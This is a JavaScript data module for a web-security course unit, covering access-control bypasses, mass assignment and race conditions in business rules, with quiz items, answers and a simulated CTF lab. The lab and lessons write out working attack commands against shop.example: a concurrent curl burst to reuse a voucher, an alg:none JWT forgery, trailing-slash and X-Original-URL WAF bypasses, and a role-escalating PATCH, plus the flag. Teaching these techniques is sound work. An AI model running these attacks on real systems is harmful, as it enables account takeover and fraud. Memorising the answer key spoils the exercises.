            "Nothing here indicates a different auth system — just inconsistent path matching between components.",
            "It's not a caching symptom; the same backend handler is simply reached by two different path strings with inconsistent blocking.",
          ],
          explain: "This is a path-normalization access-control bypass: one layer (often a WAF or reverse proxy) enforces security using an exact-string rule, while the actual application backend applies its own, more permissive, path matching — and the two disagree.",
          hints: ["Which card worked through exactly this 403→200 scenario?", "What TWO different components are involved in deciding what happens to a URL?"],
          ref: "Worked example: tracing a 403 to its bypass",
        },
        {
          type: "mc",
          q: "`PATCH /api/profile` with body `{\"name\":\"alice\",\"role\":\"admin\"}` succeeds and the caller's role actually changes to admin. What kind of bug is this?",
          options: ["Cross-site scripting", "Mass assignment — the server wrote a field the client was never meant to be able to set", "A rate-limiting bug", "An SSRF vulnerability"],
          answer: 1,
          why: [
            "No script or browser rendering is involved.",
            "",
            "Nothing here involves request throttling.",
            "No server-side request to another resource is being forged.",
          ],
          explain: "The endpoint maps the whole request body onto the user model with no allow-list restricting which fields a normal user is permitted to change — exactly the mass-assignment pattern from the explain card.",
          hints: ["Is the issue about WHO owns the object, or WHICH FIELDS can be set?", "Reread the mass assignment code example."],
          ref: "How real checks get skipped: the common failure patterns",
        },
        {
          type: "fill",
          q: "In the sentence 'authentication answers who you are; access control answers ______', fill in the blank with what access control answers.",
          answers: ["what you're allowed to do", "whether you're allowed to do this specific thing", "are you allowed to do this", "what you can do to this specific object"],
          explain: "Access control is a per-action, per-object decision made fresh on every request, based on server-held identity and ownership/role rules — distinct from the one-time identity check of authentication.",
          hints: ["Reread the intuition card's opening two sentences.", "It's not just 'what role do you have' — it also involves a specific object."],
          ref: "Why access control is a separate layer from login",
        },
        {
          type: "mc",
          q: "A logged-in user requests `GET /api/orders/4472` (not their own order) and receives full order details with no error. What's the MINIMUM additional thing you should verify before calling this a confirmed vulnerability?",
          options: [
            "Nothing more is needed — any 200 response is proof enough",
            "Confirm order 4472 genuinely belongs to a different account and the returned data is real, sensitive order content, not an empty/generic/demo response",
            "Confirm the server is using HTTPS",
            "Confirm the response time was fast",
          ],
          answer: 1,
          why: [
            "A 200 status code alone can mean many things, including a generic or empty page; you must inspect actual content.",
            "",
            "Transport encryption is unrelated to whether an authorization check was bypassed.",
            "Response speed has nothing to do with confirming the data is genuinely another user's.",
          ],
          explain: "As the relevance card stressed, a 200 status alone doesn't prove impact — you must confirm the content returned is actually another account's real, sensitive data before reporting it as a confirmed object-level authorization bypass.",
          hints: ["Reread 'what this proves — and doesn't' and the mistakes card.", "What's the difference between 'got a 200' and 'got someone else's real data'?"],
          ref: "What this proves — and doesn't",
        },
      ],
    },
    {
      id: "race-conditions",
      title: "Race conditions in business rules",
      summary: "Why 'check, then act' logic can be beaten when two requests arrive close enough together, breaking rules like 'one use per account'.",
      cards: [
        {
          kind: "objective",
          title: "What you'll be able to do",
          body: [
            "Explain why a 'check, then act' pattern across two separate steps can be exploited if those steps aren't a single atomic operation.",
            "Given a business rule (e.g. 'one redemption per account'), identify whether the described implementation is vulnerable to a race condition and explain the timing reason why.",
          ],
        },
        {
          kind: "intuition",
          title: "Why timing matters here",
          body: [
            "A server processing 'apply this one-time discount code' typically does two separate steps: (1) check — has this account already used this code? (2) act — if not, apply the discount and mark the code as used.",
            "Analogy: imagine two people at two different bank counters, at the same instant, each asking 'does this account have $100 in it?' for the SAME account that has exactly $100. Both tellers see 'yes, $100 available' (step 1, check) before either one has deducted anything (step 2, act). Both approve a $100 withdrawal. The account is now at -$100 because the check happened twice before either action was recorded.",
            "This only works because the check and the act are not a single, uninterruptible step. If a server instead used one atomic operation — '`decrement balance by 100 only if balance >= 100`', as one indivisible database operation — there's no window for two requests to both pass the check before either applies the effect.",
          ],
        },
        {
          kind: "prereq",
          title: "What 'atomic' means, concretely",
          body: [
            "An atomic operation is one that the system guarantees happens as a single indivisible unit — no other operation can be interleaved partway through it. If two atomic decrement-if-sufficient operations run 'at the same time', the database guarantees they are still processed one after the other internally, so the second one correctly sees the already-reduced balance.",
            "A NON-atomic version does the read and the write as two separate statements/requests, with a gap in between where another process (or another instance of the same request) can act on the stale value that was read before the first write landed. That gap is the 'race window'.",
            "This is sometimes abbreviated TOCTOU — Time-Of-Check to Time-Of-Use — describing exactly this gap between checking a condition and acting on it.",
          ],
          check: {
            type: "fill",
            q: "The gap between checking a condition and acting on it, which a race condition exploits, is abbreviated by what 6-letter acronym?",
            answers: ["TOCTOU"],
            explain: "TOCTOU = Time-Of-Check to Time-Of-Use. It names the exact window this lesson is about: the check and the use/act are not the same instant, so the underlying state can change in between.",
            hints: ["It literally spells out 'time of check to time of use'.", "Six capital letters."],
            ref: "What 'atomic' means, concretely",
          },
        },
        {
          kind: "explain",
          title: "Why firing requests in a burst defeats a flawed check",
          body: [
            "If 'has this code been used' is checked by reading a row, and 'mark as used' is a separate later write, then sending many copies of the request at almost exactly the same time maximises the chance that several of them pass the read-check BEFORE any of their writes land.",
            "Tools exist specifically to minimise network jitter between requests so they arrive as close to simultaneously as possible — e.g. sending many requests within a single TCP packet/connection window (sometimes called a 'single-packet attack' in HTTP/2) rather than relying on ordinary sequential requests, which naturally space themselves out and are less likely to race.",
            "This applies to any 'only once' or 'only if enough remain' business rule: one voucher per account, one refund per order, one withdrawal within a balance, one claim of a limited-stock item — anywhere a check happens before a write, without the two being combined into one atomic database operation.",
          ],
          code: `# Sending many nearly-simultaneous requests to exploit a non-atomic check
seq 20 | xargs -n1 -P20 -I{} curl -s -X POST \\
  -b 'session=abc' https://shop.example/apply-voucher -d 'code=NEW50'

# If "already used" is checked, then set, as two separate steps,
# several of the 20 requests may all read "not yet used" before any write completes.`,
          tone: "offense",
        },
        {
          kind: "example",
          title: "Worked example: diagnosing whether a rule is race-vulnerable",
          body: [
            "Scenario: 'Claim your free item — one per account' endpoint. You want to determine, from the server's described implementation, whether firing concurrent requests could let you claim two.",
            "Implementation A (read-then-write, two statements): `if (!user.hasClaimed) { giveItem(user); user.hasClaimed = true; }`. Step-by-step: request 1 reads `hasClaimed = false`, request 2 (arriving almost simultaneously) ALSO reads `hasClaimed = false` before request 1 has finished writing `true`. Both proceed to `giveItem`. Result: two items given. This IS vulnerable, because the check and the write are separate operations with a gap between them.",
            "Implementation B (atomic conditional update, one statement): `UPDATE users SET has_claimed = true WHERE id = ? AND has_claimed = false` — then check how many rows the update affected. Step-by-step: both requests submit this single statement to the database; the database processes writes to the same row one at a time internally, so whichever request's statement executes first will match `has_claimed = false` and change it to true (1 row affected = success); the second request's statement now finds `has_claimed = false` is no longer true, matches zero rows, and the server correctly reports 'already claimed'. This is NOT vulnerable, because checking and writing happen as one indivisible database operation with no gap.",
            "The distinguishing question to ask about any implementation: 'between the moment the condition is checked and the moment the result is written, could another request's read happen before this request's write completes?' If yes, it's exploitable; if the check and write are combined into a single atomic statement, it isn't.",
          ],
        },
        {
          kind: "mistakes",
          title: "Common mistakes",
          body: [
            "Assuming any 'only once' rule is automatically safe because the UI only lets you click the button once — the UI has no bearing on what the server does when multiple raw HTTP requests arrive concurrently, which is trivial to produce without using the UI at all.",
            "Assuming HTTPS or authentication prevents race conditions — encryption and identity checks say nothing about whether the server's business logic performs its check-then-act safely; a perfectly authenticated user can still race their OWN requests against the account's own state.",
            "Confusing a race condition with a brute-force attack — brute force is about trying many different GUESSES (e.g. passwords); a race condition is about timing multiple COPIES of a legitimate request to exploit a gap between check and write, regardless of guessing anything.",
          ],
        },
        {
          kind: "practice",
          title: "Guided practice",
          body: [
            "A 'redeem gift card' endpoint does: Step 1, query the card's balance; Step 2, in application code (not the database), subtract the redemption amount; Step 3, write the new balance back. Is this implementation vulnerable to a race condition? Why or why not, in terms of atomicity?",
          ],
          check: {
            type: "mc",
            q: "Is the three-step 'query, subtract in app code, write back' gift-card redemption vulnerable to a race condition?",
            options: [
              "No — because the balance is stored in a database, databases are always atomic",
              "Yes — the read (step 1) and the write (step 3) are separate operations with a gap between them, so two concurrent redemptions can both read the pre-redemption balance before either writes the new one",
              "No — because gift cards are a business feature, not a security feature",
              "Yes — but only because gift card amounts are usually small",
            ],
            answer: 1,
            why: [
              "Databases CAN be used atomically (see Implementation B), but merely storing data in one doesn't make every multi-step read-modify-write sequence atomic.",
              "",
              "Being a 'business feature' has no bearing on whether its implementation has a timing flaw.",
              "The size of the value involved is irrelevant to whether the race condition itself exists.",
            ],
            explain: "This is exactly Implementation A's pattern from the worked example, just with 'balance' instead of 'hasClaimed': a read, a calculation, and a separate write, with no single atomic statement tying them together — two concurrent requests can each read the same starting balance before either writes back the reduced result.",
            hints: ["Compare this directly to Implementation A vs B in the worked example.", "Is the subtract-and-write a single database statement, or separate steps in app code?"],
            ref: "Worked example: diagnosing whether a rule is race-vulnerable",
          },
        },
        {
          kind: "relevance",
          title: "What this proves — and doesn't",
          body: [
            "Successfully duplicating a one-time effect (e.g. redeeming a voucher twice, claiming two of a one-per-account item) by firing concurrent requests is solid, reproducible evidence of a race-condition vulnerability with measurable business impact.",
            "A single successful duplicate during testing isn't always reliable proof on its own — race conditions can be timing-dependent; a strong report notes how consistently it reproduces and under what conditions (e.g. number of concurrent requests needed).",
            "Only fire concurrent-request tests against lab environments or explicitly authorised targets, using test accounts and amounts within your authorised scope — duplicating financial effects (discounts, balances, refunds) on a live, unauthorised target causes real harm even if your intent is only to 'prove' the bug.",
          ],
        },
      ],
      exercises: [
        {
          type: "mc",
          q: "Why does firing 20 nearly-simultaneous requests have a better chance of exploiting a check-then-act flaw than sending the same 20 requests one after another with normal delay?",
          options: [
            "Simultaneous requests are processed with higher priority by the server",
            "Sending requests close together increases the chance several of them read the 'not yet used/claimed' state before any of their writes have completed, widening how many can slip through the race window",
            "The server only checks the first and last of a batch of requests",
            "HTTP requires requests to be sent in rapid succession to be valid",
            
          ],
          answer: 1,
          why: [
            "Timing doesn't grant priority; it changes the ordering of reads vs writes relative to each other.",
            "",
            "There's no such 'only checks first and last' behaviour; every request is processed.",
            "HTTP has no such timing requirement.",
          ],
          explain: "Sequential requests, spaced apart, naturally let each one's check-then-write complete before the next one's check runs, closing the race window. Near-simultaneous requests maximise the chance multiple checks happen before any writes land.",
          hints: ["Reread the intuition card's two-teller analogy.", "What does 'spacing requests apart' do to the size of the race window?"],
          ref: "Why firing requests in a burst defeats a flawed check",
        },
        {
          type: "fill",
          q: "Fill in the blank: a check-then-act sequence is NOT vulnerable to a race condition if the check and the write are combined into a single ______ database operation.",
          answers: ["atomic"],
          explain: "An atomic operation is processed as one indivisible unit by the database, eliminating the gap between checking a condition and acting on it that a race condition exploits.",
          hints: ["It's the term defined in the prereq card.", "Starts with 'a'."],
          ref: "What 'atomic' means, concretely",
        },
        {
          type: "mc",
          q: "A tester sends 50 concurrent requests to `POST /withdraw` and twice gets a result where the account balance goes negative, even though a single request always correctly rejects a withdrawal that exceeds the balance. What does the successful double-withdrawal demonstrate, and what should the report additionally note?",
          options: [
            "It proves nothing since a single request worked correctly",
            "It demonstrates a race condition in the check-then-act withdrawal logic, and the report should note how many concurrent attempts were needed and how consistently it reproduced",
            "It proves the balance field has a display bug, not a real financial issue",
            "It proves the account was compromised via phishing",
          ],
          answer: 1,
          why: [
            "A single request behaving correctly doesn't contradict a race condition only showing up under concurrency — that's the entire point of this bug class.",
            "",
            "A negative real balance from duplicated withdrawals is a logic flaw, not a cosmetic display issue.",
            "Nothing here involves credential theft or social engineering.",
          ],
          explain: "This is a textbook race condition: the single-request correctness confirms the CHECK logic itself is fine, while the concurrent failure confirms the check and the write aren't atomic. As the relevance card notes, because timing-dependent bugs can be inconsistent, a good report documents reproducibility conditions.",
          hints: ["Why would a race condition and 'single requests work fine' not be a contradiction?", "Reread 'what this proves — and doesn't'."],
          ref: "What this proves — and doesn't",
        },
      ],
    },
  ],
  lab: {
    id: "lab-auth",
    title: "CTF: admin takeover",
    tone: "offense",
    briefing: [
      "Target: https://shop.example/app",
      "You are a regular user. The admin panel has three ways in. Find any one. Flag format: FLAG{...}",
      "Hints are available after each failed check.",
    ],
    terminal: {
      host: "hunter@kali",
      commands: {
        "curl -i https://shop.example/app/":
          "Set-Cookie: token=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1MDAxIiwicm9sZSI6InVzZXIifQ.0bQ...sig\n<html>Welcome, user u001</html>",
        "echo 'eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1MDAxIiwicm9sZSI6InVzZXIifQ' | base64 -d":
          '{"alg":"HS256"}\n{"sub":"u001","role":"user"}',
        "jwt_tool eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1MDAxIiwicm9sZSI6InVzZXIifQ.0bQsig -X a":
          "[+] Trying alg:none bypass …\n[+] Forged token: eyJhbGciOiJub25lIn0.eyJzdWIiOiJ1MDAxIiwicm9sZSI6ImFkbWluIn0.",
        "curl -b 'token=eyJhbGciOiJub25lIn0.eyJzdWIiOiJ1MDAxIiwicm9sZSI6ImFkbWluIn0.' https://shop.example/app/admin":
          "HTTP/1.1 200 OK\n<h1>Admin dashboard</h1>\nFLAG{jwt_alg_none_still_1n_prod_2026}\n<a href='/app/admin/users'>users</a>",
        "curl -i https://shop.example/app/admin":
          "HTTP/1.1 403 Forbidden\n",
        "curl -i https://shop.example/app/admin/":
          "HTTP/1.1 200 OK\n<h1>Admin</h1>\n<p>Hint: /app/admin blocked by WAF prefix match; trailing slash slips past.</p>",
        "curl -i -H 'X-Original-URL: /app/admin' https://shop.example/app/anything":
          "HTTP/1.1 200 OK\n<h1>Admin</h1>\n<p>Hint: router honoured X-Original-URL; WAF saw /anything.</p>",
        "curl -X PATCH -b 'token=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1MDAxIiwicm9sZSI6InVzZXIifQ.0bQsig' https://shop.example/app/profile -d '{\"role\":\"admin\"}' -H 'Content-Type: application/json'":
          "HTTP/1.1 200 OK\n{\"id\":\"u001\",\"role\":\"admin\",\"email\":\"u001@shop.example\"}\n(hint: mass assignment)",
      },
      hints: [
        "curl -i https://shop.example/app/",
        "echo 'eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1MDAxIiwicm9sZSI6InVzZXIifQ' | base64 -d",
        "jwt_tool eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1MDAxIiwicm9sZSI6InVzZXIifQ.0bQsig -X a",
        "curl -i https://shop.example/app/admin",
        "curl -i https://shop.example/app/admin/",
        "curl -i -H 'X-Original-URL: /app/admin' https://shop.example/app/anything",
        "curl -X PATCH -b 'token=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1MDAxIiwicm9sZSI6InVzZXIifQ.0bQsig' https://shop.example/app/profile -d '{\"role\":\"admin\"}' -H 'Content-Type: application/json'",
        "curl -b 'token=eyJhbGciOiJub25lIn0.eyJzdWIiOiJ1MDAxIiwicm9sZSI6ImFkbWluIn0.' https://shop.example/app/admin",
      ],
    },
    tasks: [
      {
        q: "What algorithm does the JWT use before you tamper it?",
        answers: ["hs256", "HS256"],
        hint: "Decode the header.",
      },
      {
        q: "Which claim do you flip to escalate privilege?",
        answers: ["role", "role claim"],
        hint: "Decode the payload.",
      },
      {
        q: "Name the three bypass techniques this lab demonstrates (comma-separated, any order).",
        answers: [
          "alg none, trailing slash, x-original-url",
          "jwt alg none, trailing slash, x-original-url",
          "alg none, path, header",
        ],
        hint: "Trailing slash on /admin, X-Original-URL header, and the JWT trick.",
      },
      {
        q: "What is the flag?",
        answers: ["FLAG{jwt_alg_none_still_1n_prod_2026}", "jwt_alg_none_still_1n_prod_2026"],
        hint: "Visit /app/admin with the forged alg:none token.",
      },
    ],
  },
  ids: {
    name: "Access toolkit",
    description:
      "You understand the intended session, token, permission, and business-rule model well enough to spot where real implementations deviate from it — broken auth, forged JWTs, access-control bypasses, and race conditions.",
    rules: [],
  },
};

export default unit6;
